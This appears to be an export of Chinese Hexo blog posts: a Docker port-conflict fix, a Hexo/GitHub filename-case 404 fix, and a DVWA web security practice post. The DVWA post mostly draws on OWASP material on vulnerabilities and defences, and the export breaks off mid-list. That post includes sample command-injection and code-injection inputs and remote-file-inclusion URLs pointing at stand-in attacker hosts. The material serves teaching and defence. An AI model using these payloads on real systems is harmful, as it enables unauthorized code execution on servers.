<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker: Error response from daemon: driver failed programming external connectivity on endpoint laughing_burnell</span><br><span class="line">(bb242b2ca4d67eba76e79474fb36bb5125708ebdabd7f45c8eaf16caaabde9dd): Bind <span class="keyword">for</span> 127.0.0.1:3000 failed: port is already allocated.</span><br></pre></td></tr></table></figure>

<p>发生错误的原因是您无法在旧容器仍在运行时启动新容器。原因是旧容器已经在使用主机的 3000 端口，并且机器上只有一个进程（包括容器）可以监听特定端口。要解决此问题，您需要删除旧容器。</p>
<h2 id="删除旧容器"><a href="#删除旧容器" class="headerlink" title="删除旧容器"></a>删除旧容器</h2><p>要删除容器，您首先需要停止它。一旦停止，您就可以将其删除。您可以使用 CLI 或 Docker Desktop 的图形界面删除旧容器。选择您最满意的选项。</p>
<h3 id="使用-CLI-删除容器"><a href="#使用-CLI-删除容器" class="headerlink" title="使用 CLI 删除容器"></a>使用 CLI 删除容器</h3><ol>
<li><p>使用命令获取容器的 ID <code>docker ps</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>docker stop</code>命令停止容器。将 <the-container-id> 替换为 中的 ID <code>docker ps</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker stop &lt;the-container-id&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>容器停止后，您可以使用<code>docker rm</code>命令将其删除。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;the-container-id&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>您可以通过向命令添加标志<code>force</code>来在单个命令中停止和删除容器<code>docker rm</code>。例如：<code>docker rm -f &lt;the-container-id&gt;</code></p>
</blockquote>
<h3 id="使用-Docker-Desktop-删除容器"><a href="#使用-Docker-Desktop-删除容器" class="headerlink" title="使用 Docker Desktop 删除容器"></a>使用 Docker Desktop 删除容器</h3><ol>
<li>打开 Docker Desktop 到<strong>容器</strong>视图。</li>
<li>选择要删除的当前正在运行的旧容器的<strong>“操作”</strong>列下的垃圾桶图标。</li>
<li>在确认对话框中，选择<strong>“永久删除”</strong>。</li>
</ol>
<h3 id="启动更新的应用程序容器"><a href="#启动更新的应用程序容器" class="headerlink" title="启动更新的应用程序容器"></a>启动更新的应用程序容器</h3><ol>
<li><p>现在，使用命令启动更新的应用程序<code>docker run</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -dp 127.0.0.1:3000:3000 getting-started</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<a href="http://localhost:3000/">http://localhost:3000</a>上刷新浏览器，您应该会看到更新后的帮助文本。</p>
<p> <img src="https://cdn.huatree.top/image-20230703234456487.png" alt="image-20230703234456487"></p>
</li>
</ol>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><p>当您能够构建更新时，您可能注意到了两件事：</p>
<ul>
<li>您的待办事项列表中的所有现有项目都消失了！这不是一个很好的应用程序！您很快就会解决这个问题。</li>
<li>如此小的改变涉及很多步骤。在接下来的部分中，您将了解如何查看代码更新，而无需在每次进行更改时重建并启动新容器。</li>
</ul>
<p>在讨论持久性之前，您将了解如何与其他人共享这些镜像。</p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo部署到Github后因文件夹名大小写引起站点404</title>
    <url>/2023/09/12/20230912-Hexo%E9%83%A8%E7%BD%B2%E5%88%B0Github%E5%90%8E%E5%9B%A0%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E5%BC%95%E8%B5%B7%E7%AB%99%E7%82%B9404/</url>
    <content><![CDATA[<p>本地改了已经提交过的文件名，且文件内容 Front-matter 部分更改了 tags 标签大小写，Hexo 部署到 Github 后，访问该标签页，直接 404 了，然后我在本地使用 <code>hexo s</code> 进行预览，发现一切正常？！</p>
<span id="more"></span>

<h2 id="发现原因"><a href="#发现原因" class="headerlink" title="发现原因"></a>发现原因</h2><p>温故而知新，我最近心血来潮，规范了一下下文章标签某些单词的大小写，本地预览是没有问题的，但是提交到远程仓库之后，问题就出现了：git 默认是不区分大小写的，此即便文件夹的大小写发生了变更，git 也会表现出置之不理，导致无法找到路径。</p>
<blockquote>
<p>本地预览没有问题，是因为本地是基于 Windows 系统环境，本身默认不区分大小写。</p>
</blockquote>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>先调整本地 git 的配置文件，使其大小写敏感，然后删除<code>public</code>和<code>.deploy_git</code>目录，再使用 <code>Hexo</code> 重新生成并部署，最后在生成的<code>.deploy_git</code>目录下，找到隐藏的<code>.git</code>目录，修改配置文件<code>config</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ignorecase = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为<code>.deploy_git</code>也是 Git 项目，是推送到 Github 上部署的最终产物。</p>
</blockquote>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://baoxinwen.github.io/2022/10/03/%E2%80%9CHexo%E9%83%A8%E7%BD%B2%E5%88%B0Github%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98%E2%80%9D/">Hexo 部署到 Github 后文件夹名大小写引起的问题</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-Web渗透实践</title>
    <url>/2024/03/03/20240303-DVWA-Web%E6%B8%97%E9%80%8F%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>DVWA 是一款基于 PHP 和 mysql 开发的 web 靶场练习平台，集成了常见的 web 漏洞。</p>
<span id="more"></span>

<h2 id="Brute-Force（暴力破解）"><a href="#Brute-Force（暴力破解）" class="headerlink" title="Brute Force（暴力破解）"></a>Brute Force（暴力破解）</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>暴力破解可以以多种不同的方式表现出来，但主要包括攻击者<strong>配置预定值</strong>，使用这些值向服务器发出请求，然后分析响应。为了提高效率，攻击者可以使用字典攻击（有或没有突变）或传统的暴力攻击（使用给定的字符类别，例如：字母数字、特殊字符、区分大小写）。考虑到给定的方法、尝试次数、进行攻击的系统的效率以及被攻击的系统的估计效率，攻击者能够计算出提交所有选定的预定值大约需要多长时间。</p>
<p>如通过<strong>字典攻击</strong>获取管理员的账号和密码,在实际的操作中，一般用来破解后台管理系统的登录。</p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p><strong>提高密码质量</strong></p>
<p>用户应尝试合并字母（大小写）、数字和符号。他们可以通过混合不同字符集中的字符来实现这一点，其中包括：</p>
<ul>
<li>大写字母，例如 A、B、C；</li>
<li>小写字母，例如 a、b、c；</li>
<li>数字，例如 1、2、3；</li>
<li>特殊字符，例如 $、?、&amp;；和</li>
<li>alt 字符，例如 µ、£、Æ。</li>
</ul>
<p><strong>定期更新密码</strong></p>
<p>如 SSO 账号定期提醒更新</p>
<p><strong>密码智慧的最后一句话</strong></p>
<p>我记得在墨西哥黑客紧急响应小组页面上看到过一句很棒的短语，内容类似于“密码就像内衣：不要共享它们，不要将它们隐藏在键盘下，或者将它们挂在显示器上。最重要的是，经常更改密码” ”</p>
<h2 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>命令注入是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP 标头等）传递到系统 shell 时，可能会发生命令注入攻击。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。命令注入攻击的可能性很大程度上是由于输入验证不足。</p>
<p>此攻击与代码注入不同，代码注入允许攻击者添加自己的代码，然后由应用程序执行。在命令注入中，攻击者扩展了应用程序的默认功能，该功能执行系统命令，而无需注入代码。</p>
<h3 id="列子"><a href="#列子" class="headerlink" title="列子"></a>列子</h3><h3 id="实施例-1"><a href="#实施例-1" class="headerlink" title="实施例 1"></a>实施例 1</h3><p><em>以下代码是 UNIX 命令 cat</em>的封装，它将文件的内容打印到标准输出。它也可以注射：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"> <span class="type">char</span> cat[] = <span class="string">&quot;cat &quot;</span>;</span><br><span class="line"> <span class="type">char</span> *command;</span><br><span class="line"> <span class="type">size_t</span> commandLength;</span><br><span class="line"></span><br><span class="line"> commandLength = <span class="built_in">strlen</span>(cat) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"> command = (<span class="type">char</span> *) <span class="built_in">malloc</span>(commandLength);</span><br><span class="line"> <span class="built_in">strncpy</span>(command, cat, commandLength);</span><br><span class="line"> <span class="built_in">strncat</span>(command, argv[<span class="number">1</span>], (commandLength - <span class="built_in">strlen</span>(cat)) );</span><br><span class="line"></span><br><span class="line"> system(command);</span><br><span class="line"> <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常使用时，输出只是所请求文件的内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./catWrapper Story.txt</span><br><span class="line">When last we left our heroes...</span><br></pre></td></tr></table></figure>

<p>但是，如果我们在该行末尾添加一个分号和另一个命令，则 catWrapper 会毫无怨言地执行该命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./catWrapper <span class="string">&quot;Story.txt; ls&quot;</span></span><br><span class="line">When last we left our heroes...</span><br><span class="line">Story.txt               doubFree.c              nullpointer.c</span><br><span class="line">unstosig.c              www*                    a.out*</span><br><span class="line">format.c                strlen.c                useFree*</span><br><span class="line">catWrapper*             misnull.c               strlength.c             useFree.c</span><br><span class="line">commandinjection.c      nodefault.c             trunc.c                 writeWhatWhere.c</span><br></pre></td></tr></table></figure>

<p>如果 catWrapper 设置为具有比标准用户更高的权限级别，则可以使用该更高的权限执行任意命令。</p>
<h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h3><p>理想情况下，开发人员应该使用适合其语言的现有 API。例如 (Java)：不要使用<code>Runtime.exec()</code>发出“邮件”命令，而是使用位于<code>javax.mail.*</code>的可用 Java API 。</p>
<p>如果不存在此类可用的 API，开发人员应清除所有输入中是否存在恶意字符。实施积极的安全模型将是最有效的。通常，定义合法字符比定义非法字符容易得多。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="http://cwe.mitre.org/data/definitions/77.html">CWE-77：命令注入</a></li>
<li><a href="http://cwe.mitre.org/data/definitions/78.html">CWE-78：操作系统命令注入</a></li>
</ul>
<h2 id="Code-Injection-（代码注入）"><a href="#Code-Injection-（代码注入）" class="headerlink" title="Code Injection （代码注入）"></a>Code Injection （代码注入）</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>代码注入是攻击类型的总称，包括注入代码，然后由应用程序解释&#x2F;执行。此类攻击利用了对不可信数据的不良处理。这些类型的攻击通常是由于缺乏适当的输入&#x2F;输出数据验证而可能发生的，例如：</p>
<ul>
<li>允许的字符（标准正则表达式类或自定义）</li>
<li>数据格式</li>
<li>预期数据量</li>
</ul>
<p>代码注入与<a href="https://owasp.org/www-community/attacks/Command_Injection">命令注入的</a>不同之处在于，攻击者仅受注入语言本身功能的限制。如果攻击者能够将 PHP 代码注入应用程序并执行它，他们只会受到 PHP 能力的限制。命令注入包括利用现有代码来执行命令，通常是在 shell 的上下文中。</p>
<h3 id="风险因素"><a href="#风险因素" class="headerlink" title="风险因素"></a>风险因素</h3><ul>
<li>这些类型的漏洞可能非常难以发现，也可能很容易发现</li>
<li>如果发现，通常很难利用，具体取决于场景</li>
<li>如果成功利用，影响可能包括机密性丧失、完整性丧失、可用性丧失和责任丧失</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>实施列 1</strong></p>
<p>如果应用程序将通过 GET 请求发送的参数传递给 PHP <code>include()</code>函数而不进行输入验证，则攻击者可能会尝试执行开发人员预期之外的代码。</p>
<p>下面的 URL 将页面名称传递给该<code>include()</code>函数。 <code>http://testsite.com/index.php?page=contact.php</code></p>
<p>例如，文件“evilcode.php”可能包含 phpinfo() 函数，该函数对于获取有关 Web 服务运行的环境的配置信息非常有用。攻击者可以使用以下请求要求应用程序执行其 PHP 代码： <code>http://testsite.com/?page=http://evilsite.com/evilcode.php</code></p>
<p><strong>实施例 2</strong></p>
<p>当开发人员使用 PHP<code>eval()</code>函数并向其传递攻击者可以修改的不受信任的数据时，就可能发生代码注入。</p>
<p>下面的示例显示了使用该<code>eval()</code>函数的危险方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$myvar</span> = <span class="string">&quot;varname&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$myvar</span> = <span class="subst">$x</span>;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>由于没有输入验证，上面的代码很容易受到代码注入攻击。</p>
<p>例如：<code>/index.php?arg=1; phpinfo()</code></p>
<p>在利用此类错误时，攻击者可能想要执行系统命令。在这种情况下，代码注入 bug 也可以用于命令注入，例如：<code>/index.php?arg=1; system(&#39;id&#39;)</code></p>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="http://cwe.mitre.org/data/definitions/77.html">CWE-77：命令注入</a></li>
<li><a href="http://cwe.mitre.org/data/definitions/78.html">CWE-78：操作系统命令注入</a></li>
<li><a href="http://cwe.mitre.org/data/definitions/77.html">CWE-89：SQL 注入</a></li>
</ul>
<h2 id="CSRF（Cross-Site-Request-Forgery-跨站请求伪造）"><a href="#CSRF（Cross-Site-Request-Forgery-跨站请求伪造）" class="headerlink" title="CSRF（Cross Site Request Forgery 跨站请求伪造）"></a>CSRF（Cross Site Request Forgery 跨站请求伪造）</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>跨站点请求伪造 (CSRF) 是一种攻击，它迫使最终用户在其当前经过身份验证的 Web 应用程序上执行不需要的操作。在社会工程的帮助下（例如通过电子邮件或聊天发送链接），攻击者可能会诱骗 Web 应用程序的用户执行攻击者选择的操作。如果受害者是普通用户，成功的 CSRF 攻击可以迫使用户执行状态更改请求，例如转移资金、更改电子邮件地址等。如果受害者是管理帐户，CSRF 可能会危害整个 Web 应用程序。</p>
<h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><ul>
<li>OWASP<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">跨站点请求伪造 (CSRF) 预防备忘单</a></li>
<li><a href="http://www.cgisecurity.com/articles/csrf-faq.shtml">跨站请求伪造 (CSRF&#x2F;XSRF) 常见问题解答</a></li>
</ul>
<blockquote>
<p>“本文是跨站请求伪造问题的动态文档。该文档将作为现有论文、演讲和邮件列表帖子的信息存储库，并将随着新信息的发现而更新。”*</p>
</blockquote>
<ul>
<li>CSRF 测试<ul>
<li>来自 OWASP 测试指南项目的 CSRF（又名会话骑行）论文。</li>
</ul>
</li>
<li>CSRF 漏洞：“沉睡的巨人”<ul>
<li>概述论文</li>
</ul>
</li>
<li>针对会话骑乘的客户端保护<ul>
<li>Martin Johns 和 Justus Winter 在第四届 OWASP AppSec 会议上发表的有趣论文和演示，其中描述了浏览器可以采用的自动提供 CSRF 保护的潜在技术 - <a href="https://wiki.owasp.org/index.php/File:RequestRodeo-MartinJohns.pdf">PDF 论文</a></li>
</ul>
</li>
<li>OWASP CSRF 守卫<ul>
<li>J2EE、.NET 和 PHP 过滤器将唯一的请求令牌附加到 HTML 响应中的每个表单和链接，以便在整个应用程序中提供针对 CSRF 的普遍覆盖。</li>
</ul>
</li>
<li>OWASP CSRF 保护器<ul>
<li>缓解 Web 应用程序中 CSRF 的反 CSRF 方法。目前作为 PHP 库和 Apache 2.xx 模块实现</li>
</ul>
</li>
<li>关于跨站请求伪造 (CSRF) 最容易被忽视的事实<ul>
<li>Aung Khant，<a href="http://yehg.net/">http://yehg.net</a>，通过危险场景解释了 CSRF 的危险和影响。</li>
</ul>
</li>
<li>Pinata-CSRF-Tool：CSRF POC 工具<ul>
<li>Pinata 可以轻松创建概念验证 CSRF 页面。协助应用程序漏洞评估。</li>
</ul>
</li>
</ul>
<h2 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>文件包含漏洞允许攻击者包含文件，通常利用目标应用程序中实现的“动态文件包含”机制。该漏洞的发生是由于在未经适当验证的情况下使用用户提供的输入。</p>
<p>这可能会导致输出文件内容，但根据严重程度，它也可能导致：</p>
<ul>
<li>Web 服务器上的代码执行</li>
<li>客户端代码执行（例如 JavaScript）可能导致其他攻击，例如跨站脚本 (XSS)</li>
<li>拒绝服务 (DoS)</li>
<li>敏感信息披露</li>
</ul>
<p>当应用程序使用攻击者控制的变量构建可执行代码的路径时，会导致此问题，从而允许攻击者控制在运行时执行哪个文件。文件包含漏洞与通用目录遍历攻击不同，目录遍历是获得未经授权的文件系统访问的一种方式，而文件包含漏洞会破坏应用程序加载代码以执行的方式。成功利用文件包含漏洞将导致在运行受影响的 Web 应用程序的 Web 服务器上远程执行代码。攻击者可以使用远程执行代码在 Web 服务器上创建 Web shell，该 Web shell 可用于网站篡改。</p>
<h2 id="Local-File-Inclusion（本地文件包含）"><a href="#Local-File-Inclusion（本地文件包含）" class="headerlink" title="Local File Inclusion（本地文件包含）"></a>Local File Inclusion（本地文件包含）</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>本地文件包含（也称为 LFI）是通过利用应用程序中实施的易受攻击的包含过程来包含已本地存在于服务器上的文件的过程。例如，当页面接收必须包含的文件的路径作为输入并且该输入未正确清理时，就会出现此漏洞，从而允许注入目录遍历字符（例如点-点-斜杠）。尽管大多数示例都指向易受攻击的 PHP 脚本，但我们应该记住，它在 JSP、ASP 等其他技术中也很常见。</p>
<h3 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h3><p>由于 LFI 是在传递给<code>include</code>语句的路径未正确清理时发生的，因此在黑盒测试方法中，我们应该寻找以文件名作为参数的脚本。</p>
<p>考虑以下示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://vulnerable_host/preview.php?file=example.html</span><br></pre></td></tr></table></figure>

<p>这看起来是尝试 LFI 的完美场所。如果攻击者足够幸运，并且脚本不是通过名称从数组中选择适当的页面，而是直接包含输入参数，则有可能包含服务器上的任意文件。</p>
<h3 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施"></a>防御措施</h3><p>消除文件包含漏洞的最有效解决方案是避免将用户提交的输入传递给任何文件系统&#x2F;框架 API。如果这不可能，应用程序可以维护页面可能包含的文件允许列表，然后使用标识符（例如索引号）来访问所选文件。任何包含无效标识符的请求都必须被拒绝，这样就不会有恶意用户操纵路径的攻击面。</p>
<h3 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://www.wikipedia.org/wiki/Local_File_Inclusion">维基百科</a></li>
<li><a href="https://en.wikipedia.org/wiki/Null_character">空字符</a></li>
<li><a href="https://owasp.org/www-community/attacks/Unicode_Encoding">统一编码</a></li>
<li><a href="https://owasp.org/www-community/Double_Encoding">双编码</a></li>
<li><a href="https://www.php.net/manual/en/wrappers.php">PHP 支持的协议和包装器</a></li>
<li><a href="http://www.faqs.org/rfcs/rfc2397.html">RFC 2397 - “数据”URL 方案</a></li>
</ul>
<h2 id="Remote-File-Inclusion（远程文件包含）"><a href="#Remote-File-Inclusion（远程文件包含）" class="headerlink" title="Remote File Inclusion（远程文件包含）"></a>Remote File Inclusion（远程文件包含）</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>远程文件包含（也称为 RFI）是通过利用应用程序中实施的易受攻击的包含过程来包含远程文件的过程。例如，当页面接收到必须包含的文件的路径作为输入，并且该输入未正确清理，从而允许注入外部 URL 时，就会出现此漏洞。尽管大多数示例都指向易受攻击的 PHP 脚本，但我们应该记住，它在 JSP、ASP 等其他技术中也很常见。</p>
<h3 id="如何测试-1"><a href="#如何测试-1" class="headerlink" title="如何测试"></a>如何测试</h3><p>由于当传递给“include”语句的路径未正确清理时就会发生 RFI，因此在黑盒测试方法中，我们应该寻找以文件名作为参数的脚本。考虑以下 PHP 示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$incfile</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$incfile</span>.<span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>在此示例中，路径是从 HTTP 请求中提取的，并且未进行输入验证（例如，通过根据允许列表检查输入），因此这段代码很容易受到此类攻击。考虑以下 URL：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page</span><br></pre></td></tr></table></figure>

<p>在这种情况下，将包含远程文件，并且其中包含的任何代码都将由服务器运行。</p>
<h3 id="防御措施-3"><a href="#防御措施-3" class="headerlink" title="防御措施"></a>防御措施</h3><p>消除文件包含漏洞的最有效解决方案是避免将用户提交的输入传递给任何文件系统&#x2F;框架 API。如果这不可能，应用程序可以维护页面可能包含的文件允许列表，然后使用标识符（例如索引号）来访问所选文件。任何包含无效标识符的请求都必须被拒绝，这样就不会有恶意用户操纵路径的攻击面。</p>
<h3 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h3><ul>
<li>[“远程文件包含”](<a href="http://projects.webappsec.org/w/page/13246955/Remote">http://projects.webappsec.org/w/page/13246955/Remote</a> File Inclusion)</li>
<li><a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion">维基百科：“远程文件包含”</a></li>
</ul>
<h2 id="File-Upload（文件上传）"><a href="#File-Upload（文件上传）" class="headerlink" title="File Upload（文件上传）"></a>File Upload（文件上传）</h2><h3 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h3><p>上传的文件对应用程序构成重大风险。许多攻击的第一步是向要攻击的系统获取一些代码。那么攻击只需要找到一种方法来让代码执行即可。使用文件上传可以帮助攻击者完成第一步。</p>
<p>不受限制的文件上传的后果可能会有所不同，包括完全系统接管、文件系统或数据库过载、将攻击转发到后端系统、客户端攻击或简单的破坏。这取决于应用程序对上传文件的处理方式，尤其是文件的存储位置。</p>
<p>这里确实存在两类问题。第一个是文件元数据，例如路径和文件名。这些通常由传输提供，例如 HTTP 多部分编码。这些数据可能会欺骗应用程序覆盖关键文件或将文件存储在错误的位置。在使用元数据之前，您必须非常仔细地对其进行验证。</p>
<p>另一类问题与文件大小或内容有关。这里问题的范围完全取决于文件的用途。请参阅下面的示例，了解有关文件如何被滥用的一些想法。为了防止此类攻击，您应该分析应用程序对文件执行的所有操作，并仔细考虑涉及哪些处理和解释器。</p>
<h3 id="风险因素-1"><a href="#风险因素-1" class="headerlink" title="风险因素"></a>风险因素</h3><ul>
<li>该漏洞的影响很高，假定的代码可以在服务器上下文或客户端执行。攻击者被发现的可能性很高。患病率很常见。因此，此类漏洞的严重性很高。</li>
<li>检查文件上传模块的访问控制以正确检查风险非常重要。</li>
<li>服务器端攻击：Web 服务器可以通过上传并执行 Web-Shell 来受到破坏，该 Web-Shell 可以运行命令、浏览系统文件、浏览本地资源、攻击其他服务器或利用本地漏洞等。</li>
<li>客户端攻击：上传恶意文件可能会使网站容易受到客户端攻击，例如 <a href="https://owasp.org/www-community/vulnerabilities/Cross-site_Scripting_/(XSS/)">XSS</a>或跨站点内容劫持。</li>
<li>当需要同一服务器或受信任服务器上的文件时，上传的文件可能会被滥用以利用应用程序的其他易受攻击的部分（可能再次导致客户端或服务器端攻击）</li>
<li>上传的文件可能会触发客户端损坏的库&#x2F;应用程序中的漏洞（例如 iPhone MobileSafari LibTIFF 缓冲区溢出）。</li>
<li>上传的文件可能会触发服务器端损坏的库&#x2F;应用程序中的漏洞（例如，称为 ImageTragick 的 ImageMagick 缺陷！）。</li>
<li>上传的文件可能会触发损坏的实时监控工具中的漏洞（例如，通过解压 RAR 文件来利用赛门铁克防病毒软件）</li>
<li>Unix shell 脚本、Windows 病毒、带有危险公式的 Excel 文件或反向 shell 等恶意文件可以上传到服务器上，以便管理员或网站管理员稍后在受害者的计算机上执行代码。</li>
<li>攻击者可能能够将网络钓鱼页面放入网站或破坏网站。</li>
<li>文件存储服务器可能被滥用来托管麻烦的文件，包括恶意软件、非法软件或成人内容。上传的文件还可能包含恶意软件的命令和控制数据、暴力和骚扰消息或可供犯罪组织使用的隐写数据。</li>
<li>上传的敏感文件可能会被未经授权的人访问。</li>
<li>文件上传者可能会在其错误消息中公开内部信息，例如服务器内部路径。</li>
</ul>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p><strong>应用平台攻击</strong></p>
<ul>
<li>将 .jsp 文件上传到 Web 树 - 以 Web 用户身份执行 jsp 代码</li>
<li>上传要调整大小的 .gif 文件 - 利用图像库缺陷</li>
<li>上传大文件-文件空间拒绝服务</li>
<li>使用恶意路径或名称上传文件 - 覆盖关键文件</li>
<li>上传包含个人数据的文件 - 其他用户访问它</li>
<li>上传包含“标签”的文件 - 标签作为“包含”在网页中的一部分而被执行</li>
<li>上传 .rar 文件以供防病毒扫描 - 在运行易受攻击的防病毒软件的服务器上执行的命令</li>
</ul>
<p><strong>对其他系统的攻击</strong></p>
<ul>
<li>将 .exe 文件上传到网络树 - 受害者下载木马可执行文件</li>
<li>上传受病毒感染的文件 - 受害者的计算机被感染</li>
<li>上传包含脚本的 .html 文件 - 受害者遭遇<a href="https://owasp.org/www-community/vulnerabilities/Cross-site_Scripting_/(XSS/)">跨站脚本 (XSS)</a></li>
<li>上传包含 Flash 对象的 .jpg 文件 - 受害者遭遇跨站点内容劫持。</li>
<li>上传 .rar 文件以供防病毒扫描 - 在运行易受攻击的防病毒软件的客户端上执行的命令</li>
</ul>
<h3 id="防御措施-4"><a href="#防御措施-4" class="headerlink" title="防御措施"></a>防御措施</h3><p>对开发者和网站管理员的一些特别建议：</p>
<ul>
<li>允许上传的文件类型应仅限于业务功能所需的文件类型。</li>
<li>如果没有允许列表过滤器，切勿直接接受文件名及其扩展名。</li>
<li>应用程序应对上传到服务器的任何文件执行过滤和内容检查。文件在提供给其他用户之前应经过彻底扫描和验证。如有疑问，应丢弃该文件。</li>
<li>有必要在 Web 应用程序上有一个仅允许的扩展的列表。并且，可以从列表中选择文件扩展名。例如，可以使用“选择大小写”语法（如果有 VBScript）来根据实际文件扩展名选择文件扩展名。</li>
<li>所有控制字符和 Unicode 字符都应从文件名及其扩展名中删除，无一例外。另外，特殊字符如“;”、“:”、“&gt;”、“&lt;”、“&#x2F;”、“\”、附加“.”、“*”、“%”、“$”等on 也应该被丢弃。如果适用并且不需要 Unicode 字符，强烈建议仅接受字母数字字符和 1 个点作为文件名和扩展名的输入；其中文件名和扩展名根本不应该为空（正则表达式：） <code>^\[a-zA-Z0-9\]&#123;1,200&#125;\\.\[a-zA-Z0-9\]&#123;1,10&#125;$</code>。</li>
<li>限制文件名长度。例如，NTFS 分区中文件名加上扩展名的最大长度应小于 255 个字符（不含任何目录）。</li>
<li>建议使用算法来确定文件名。例如，文件名可以是文件名加上当天日期的哈希值。</li>
<li>上传的目录不应具有任何“执行”权限，并且应从这些目录中删除所有脚本处理程序。</li>
<li>将文件大小限制为最大值，以防止拒绝服务攻击（针对文件空间或其他 Web 应用程序的功能，例如图像缩放器）。</li>
<li>限制小文件，因为它们可能导致拒绝服务攻击。因此，应考虑文件的最小大小。</li>
<li>使用跨站点请求伪造保护方法。</li>
<li>防止在两者具有相同哈希值的情况下覆盖文件。</li>
<li>在服务器上使用病毒扫描程序（如果适用）。或者，如果文件内容不保密，则可以使用免费的病毒扫描程序网站。在这种情况下，文件应先以随机名称且不带任何扩展名的方式存储在服务器上，然后进行病毒检查（上传到免费病毒扫描网站并返回结果）后，可以将其重命名为特定名称并进行病毒检查。扩大。</li>
<li>尝试使用 POST 方法而不是 PUT（或 GET！）</li>
<li>记录用户的活动。然而，日志记录机制应该防止日志伪造和代码注入本身。</li>
